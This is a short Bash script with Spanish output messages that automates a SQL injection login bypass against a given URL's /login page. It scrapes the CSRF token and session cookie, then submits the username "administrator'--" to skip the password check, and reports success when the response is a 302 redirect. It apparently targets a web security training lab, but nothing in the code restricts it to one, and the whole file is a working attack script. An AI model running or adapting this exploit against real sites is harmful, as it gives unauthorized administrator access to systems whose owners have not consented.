#!/bin/bash

gyC="\e[0;37m\033[1m"
yC="\e[0;33m\033[1m"
bC="\e[0;34m\033[1m"
gC="\e[0;32m\033[1m"
rC="\e[0;31m\033[1m"
eC="\033[0m\e[0m"

html=""

[ $# -eq 0 ] && echo -e "\n${yC}[+] ${gyC}Uso: ${gC}${0} ${bC}<url>${eC}\n" && exit 1
url=${1%/}"/login"
echo -e "\n${yC}[+] ${gyC}Realizando peticion GET a ${bC}${url}${eC}"
html=$(curl -i -s $url) 
[ ! $? -eq 0 ] && echo -e "\n${rC}[!] ${gyC}Verifica la url${eC}\n" && exit 1
csrf=$(echo -e "${html}" | grep "csrf" | grep -P -o 'value="\K[^"]*')
cookie=$(echo -e "${html}" | grep -P -o "session=\K[^;]*")
username="administrator'--"
password="123456"

echo -e "\n${yC}[+] ${gyC}Datos obtenidos necesarios: ${eC}"
echo -e "\t${gyC}csrf: ${gC}${csrf}${eC}"
echo -e "\t${gyC}cookie: ${gC}${cookie}${eC}"

data="csrf=${csrf}&username=${username}&password=${password}"

echo -e "\n${yC}[+] ${gyC}Parametros para peticion POST a ${bC}${url}${eC}"
echo -e "\t${gyC}Cookie: ${gC}session=${cookie}${eC}"
echo -e "\t${gyC}Data: ${gC}${data}${eC}"
echo -e "\t${yC}[+]${gyC} SQL Injection en parametro 'username': ${rC}${username}${eC}"

responseLogin=$(curl -s -i --cookie "session=${cookie};" -d"${data}" ${url} 2>/dev/null )
echo -e "${responseLogin}" | grep "302" &>/dev/null || exit 1 
echo -e "\n${yC}[+] ${gyC}Inicio de sesion exitoso:${eC}\n"; sleep 1
echo -e "${responseLogin}" | awk '{print "\t"$0}'
